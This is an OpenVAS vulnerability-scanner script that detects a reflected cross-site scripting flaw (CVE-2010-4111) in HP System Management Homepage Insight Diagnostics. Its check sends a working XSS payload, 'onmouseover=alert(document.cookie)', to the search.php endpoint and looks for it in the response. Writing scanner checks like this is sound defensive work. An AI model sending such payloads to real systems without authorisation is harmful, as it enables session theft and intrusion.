###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_hp_smh_insight_diag_help_xss_vuln.nasl 13660 2019-02-14 09:48:45Z cfischer $
#
# HP SMH Insight Diagnostics 'help/search.php?' Cross Site Scripting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:hp:system_management_homepage";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902431");
  script_version("$Revision: 13660 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-06-01 11:16:16 +0200 (Wed, 01 Jun 2011)");
  script_cve_id("CVE-2010-4111");
  script_bugtraq_id(45420);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("HP SMH Insight Diagnostics 'help/search.php?' Cross Site Scripting Vulnerability");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_hp_smh_detect.nasl");
  script_mandatory_keys("HP/SMH/installed");
  script_require_ports("Services/www", 2301, 2381);

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to inject arbitrary HTML code
  in the context of an affected site.");

  script_tag(name:"affected", value:"HP Insight Diagnostics Online Edition before 8.5.1.3712.");

  script_tag(name:"insight", value:"The flaw is caused due imporper validation of user supplied input via
  'query=onmouseover=' to the '/frontend2/help/search.php?', which allows
  attackers to execute arbitrary HTML and script code in a user's browser
  session in the context of an affected site.");

  script_tag(name:"solution", value:"Upgrade to 8.5.1.3712 or higher versions or refer vendor advisory for update.");

  script_tag(name:"summary", value:"The host is running HP SMH with Insight Diagnostics and is prone
  to cross-site scripting vulnerability.");

  script_xref(name:"URL", value:"http://marc.info/?l=bugtraq&m=129245189832672&w=2");
  script_xref(name:"URL", value:"http://securitytracker.com/alerts/2010/Dec/1024897.html");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101636/PR10-11.txt");
  script_xref(name:"URL", value:"http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02652463");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!hpsmhPort = get_app_port(cpe:CPE)){
  exit(0);
}

useragent = http_get_user_agent();
host = http_host_name(port:hpsmhPort);

attackPath = '/hpdiags/frontend2/help/search.php?query="onmouseover="alert(document.cookie);';
req = string( "GET ", attackPath, " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
              "User-Agent: ", useragent, "\r\n",
              "Cookie: Compaq-HMMD=0001-8a3348dc-f004-4dae-a746-211a6" +
              "d70fd51-1292315018889768; HPSMH-browser-check=done for" +
              " this session; curlocation-hpsmh_anonymous=; PHPSESSID=" +
              "2389b2ac7c2fb11b7927ab6e54c43e64\r\n",
              "\r\n");
rcvRes = http_keepalive_send_recv(port:hpsmhPort, data:req);

if(rcvRes =~ "HTTP/1\.. 200" && '="alert(document.cookie);"' >< rcvRes){
  report = report_vuln_url(port:hpsmhPort, url:attackPath);
  security_message(port:hpsmhPort, data:report);
}

exit(99);